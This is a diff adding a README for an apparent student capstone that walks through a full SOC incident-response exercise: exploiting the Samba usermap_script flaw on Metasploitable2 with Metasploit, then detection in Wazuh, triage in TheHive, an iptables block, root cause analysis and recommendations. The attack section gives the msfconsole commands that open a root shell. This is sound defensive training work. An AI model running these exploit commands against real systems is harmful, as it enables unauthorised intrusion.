@@ -1,1 +1,206 @@
+# 📌 Capstone Project: Comprehensive SOC Incident Response
 
+## 1. Overview
+
+This project demonstrates a complete Security Operations Center (SOC) workflow, including attack simulation, detection, triage, response, adversary emulation, and reporting. A vulnerable system (Metasploitable2) was targeted using Metasploit, while Wazuh was used for monitoring and detection.
+
+---
+
+## 2. Lab Environment Setup
+
+### Machines Used:
+
+* **Kali Linux** – Attacker machine (Metasploit, Caldera)
+* **Metasploitable2** – Target machine
+* **Wazuh Server** – SIEM monitoring
+* **TheHive** – Incident response platform
+* **CrowdSec** – IP blocking (simulated/manual)
+
+### Network Configuration:
+
+* Kali IP: 192.168.56.1
+* Metasploitable IP: 192.168.56.102
+* Wazuh Server IP: 192.168.56.106
+
+---
+
+## 3. Attack Simulation (Metasploit)
+
+### Objective:
+
+Exploit a known Samba vulnerability on Metasploitable2.
+
+### Steps:
+
+1. Launch Metasploit:
+
+   ```
+   msfconsole
+   ```
+2. Select exploit:
+
+   ```
+   use exploit/multi/samba/usermap_script
+   ```
+3. Configure target:
+
+   ```
+   set RHOSTS 192.168.56.102
+   set LHOST 192.168.56.1
+   ```
+4. Execute exploit:
+
+   ```
+   exploit
+   ```
+
+### Result:
+
+* Remote shell session established
+* Root-level access obtained
+
+---
+
+## 4. Detection and Monitoring (Wazuh)
+
+### Objective:
+
+Identify malicious activity generated during the attack.
+
+### Observations:
+
+* Unauthorized root session detected
+* Privilege escalation using sudo commands
+* Authentication logs indicating suspicious behavior
+
+### Note:
+
+Direct Samba exploit logs were not captured due to lack of Wazuh agent on the target system. However, post-exploitation indicators confirmed compromise.
+
+### Detection Table:
+
+| Timestamp        | Source IP    | Alert Description                    | MITRE Technique |
+| ---------------- | ------------ | ------------------------------------ | --------------- |
+| 2026-04-13 13:56 | 192.168.56.1 | Unauthorized root session detected   | T1210           |
+| 2026-04-13 13:57 | 192.168.56.1 | Privilege escalation activity (sudo) | T1068           |
+
+---
+
+## 5. Adversary Emulation (MITRE Caldera)
+
+### Objective:
+
+Simulate attacker behavior using MITRE ATT&CK techniques.
+
+### Steps:
+
+1. Start Caldera server
+2. Access web interface (http://localhost:8888)
+3. Create operation
+4. Execute ability mapped to **T1210 (Exploitation of Remote Services)**
+
+### Result:
+
+* Attack simulation executed
+* Behavior aligned with initial exploitation technique
+
+---
+
+## 6. Incident Triage (TheHive)
+
+### Objective:
+
+Track and investigate the incident.
+
+### Actions:
+
+* Created case: **“Samba Exploit Incident”**
+* Added observable: Attacker IP (192.168.56.1)
+* Assigned severity: High
+
+---
+
+## 7. Response and Containment
+
+### Objective:
+
+Prevent further attacker access.
+
+### Action Taken:
+
+Blocked attacker IP using firewall rule:
+
+```
+sudo iptables -A INPUT -s 192.168.56.1 -j DROP
+```
+
+### Verification:
+
+* Ping test from attacker machine failed
+* Access successfully restricted
+
+---
+
+## 8. SOAR Playbook (Automation Design)
+
+### Workflow:
+
+```
+Wazuh Alert → Check IP Reputation → Block via CrowdSec → Create TheHive Case
+```
+
+### Description:
+
+A semi-automated response process was designed to reduce response time and improve efficiency.
+
+---
+
+## 9. Root Cause Analysis (RCA)
+
+### 5 Whys:
+
+1. Why did the attack occur? → Samba vulnerability exploited
+2. Why was it vulnerable? → System not patched
+3. Why not patched? → Lack of patch management
+4. Why no management? → No defined security process
+5. Why no process? → Weak governance
+
+### Fishbone Categories:
+
+* People: Lack of training
+* Process: No patching policy
+* Technology: Vulnerable service
+* Network: Open ports
+
+---
+
+## 10. Security Metrics
+
+| Metric     | Value   |
+| ---------- | ------- |
+| MTTD       | 2 hours |
+| MTTR       | 4 hours |
+| Dwell Time | 6 hours |
+
+---
+
+## 11. Reporting
+
+### Key Findings:
+
+* System was vulnerable to remote exploitation
+* Lack of monitoring on target limited visibility
+* Detection was achieved via indirect indicators
+
+### Recommendations:
+
+* Install monitoring agents on all systems
+* Implement regular patching
+* Enable automated response mechanisms
+* Improve visibility and alerting
+
+---
+
+## 12. Conclusion
+
+The project successfully demonstrated a full incident response lifecycle. While detection limitations existed, the attack was identified through behavioral indicators, and appropriate containment measures were implemented. The exercise highlights the importance of endpoint visibility, proactive defense, and automation in modern SOC operations.
